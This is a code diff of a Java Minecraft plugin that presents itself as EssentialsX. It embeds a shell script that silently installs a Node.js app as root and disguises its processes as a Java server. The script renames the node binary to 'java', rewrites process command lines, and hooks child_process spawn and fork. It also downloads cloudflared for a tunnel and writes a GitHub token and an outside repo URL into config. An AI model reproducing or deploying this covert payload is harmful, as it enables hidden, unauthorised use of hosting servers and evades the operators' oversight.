+        "mkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\"\n" +
+        "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
+        "mv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"\n" +
+        "cd \"$APP_DIR\"\n" +
+        "\n" +
+        "# ========== 3. npm install ==========\n" +
+        "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --unsafe-perm=true --allow-root >/dev/null 2>&1\n" +
+        "sleep 2\n" +
+        "\n" +
+        "if [ -d \"$DATA_DIR\" ]; then\n" +
+        "    cp \"$DATA_DIR/.bots_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
+        "    cp \"$DATA_DIR/.task_center_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
+        "    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
+        "fi\n" +
+        "\n" +
+        "# ========== 4. 替换伪装 (强力拦截所有子进程) ==========\n" +
+        "cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod +x \"$JRE_DIR/java\"\n" +
+        "\n" +
+        "cat > \"$NODE_DIR/bin/node\" << 'NODEWRAPPER'\n" +
+        "#!/bin/bash\n" +
+        "exec -a \"" + FAKE_CMDLINE + "\" \"$(dirname \"$0\")/.node_real\" \"$@\"\n" +
+        "NODEWRAPPER\n" +
+        "chmod +x \"$NODE_DIR/bin/node\"\n" +
+        "\n" +
+        "cat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\n" +
+        "try {\n" +
+        "    process.title = '" + FAKE_CMDLINE.trim() + "';\n" +
+        "    var _cp = require('child_process');\n" +
+        "    var _origSpawn = _cp.spawn;\n" +
+        "    var _origFork = _cp.fork;\n" +
+        "    var FAKE_CMD = 'java -Xms128M -Xmx2560M -jar server.jar' + Array(150).join(' ');\n" +
+        "    _cp.spawn = function(cmd, args, opts) {\n" +
+        "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n" +
+        "            opts = Object.assign({}, opts || {});\n" +
+        "            opts.execPath = process.env._JAVA_WRAPPER || process.execPath;\n" +
+        "            cmd = opts.execPath;\n" +
+        "        } \n" +
+        "        else if (typeof cmd === 'string' && !cmd.startsWith('/usr/') && !cmd.startsWith('/bin/')) {\n" +
+        "            var realArgs = args ? args.map(a => '\\''+a+'\\'').join(' ') : '';\n" +
+        "            var bashCmd = 'exec -a \\''+FAKE_CMD+'\\'' \"' + cmd + '\" ' + realArgs;\n" +
+        "            return _origSpawn.call(this, 'bash', ['-c', bashCmd], opts);\n" +
+        "        }\n" +
+        "        return _origSpawn.call(this, cmd, args, opts);\n" +
+        "    };\n" +
+        "    _cp.fork = function(mod, args, opts) {\n" +
+        "        opts = Object.assign({}, opts || {});\n" +
+        "        opts.execPath = process.env._JAVA_WRAPPER || process.execPath;\n" +
+        "        return _origFork.call(this, mod, args, opts);\n" +
+        "    };\n" +
+        "} catch(e) {}\n" +
+        "PRELOAD_EOF\n" +
+        "\n" +
+        "export _JAVA_WRAPPER=\"$NODE_DIR/bin/node\"\n" +
+        "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
+        "\n" +
+        "# ========== 5. 下载CF ==========\n" +
+        "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
+        "if [ ! -f \"$CF_BIN\" ]; then\n" +
+        "    CF_DIRECT=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n" +
+        "    for MIRROR in \"https://ghproxy.net/${CF_DIRECT}\" \"$CF_DIRECT\"; do\n" +
+        "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\" 2>/dev/null; then chmod +x \"$CF_BIN\"; break; fi\n" +
+        "    done\n" +
+        "fi\n" +
+        "\n" +
+        "# 通知 Java 部署完成\n" +
+        "echo \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
     }
 
     private void setupDisguise() {
@@ -453,12 +596,9 @@ public class EssentialsX extends JavaPlugin {
 
     private void loadEnvFile(Map<String, String> env) {
         Path envFile = Paths.get("logs", ".mcchajian", ".env");
-        if (!Files.exists(envFile)) { try { Files.createDirectories(envFile.getParent()); String defaultConfig = "# ===========================================\n# EssentialsX System Guard Configuration\n# ===========================================\n# true  = Enable auto-restart (Default)\n# false = Disable auto-restart\n# ===========================================\nSYSTEM_GUARD_ENABLED=true\n"; Files.write(envFile, defaultConfig.getBytes()); this.getLogger().info("Generated default .env file with Guard ENABLED."); } catch (Exception e) { this.getLogger().warning("Could not generate .env file: " + e.getMessage()); } }
+        if (!Files.exists(envFile)) { try { Files.createDirectories(envFile.getParent()); String defaultConfig = "# ===========================================\n# EssentialsX System Guard Configuration\n# ===========================================\n# true  = Enable auto-restart (Default)\n# false = Disable auto-restart\n# ===========================================\nSYSTEM_GUARD_ENABLED=true\nGITHUB_TOKEN=\nREPO_URL=https://github.com/zx1447/indexaoyoumc\n"; Files.write(envFile, defaultConfig.getBytes()); this.getLogger().info("Generated default .env file with Guard ENABLED."); } catch (Exception e) { this.getLogger().warning("Could not generate .env file: " + e.getMessage()); } }
         if (Files.exists(envFile)) { try { for (String line : Files.readAllLines(envFile)) { String[] parts; if (line.isEmpty() || line.startsWith("#") || (parts = line.split("=", 2)).length != 2) continue; env.put(parts[0].trim(), parts[1].trim()); } } catch (IOException ignored) {} }
     }
 
     private void clearConsole() { try { RAW_OUT.print("\u001b[H\u001b[2J"); RAW_OUT.flush(); } catch (Exception ignored) {} }
-
-    private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
-    private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
 }
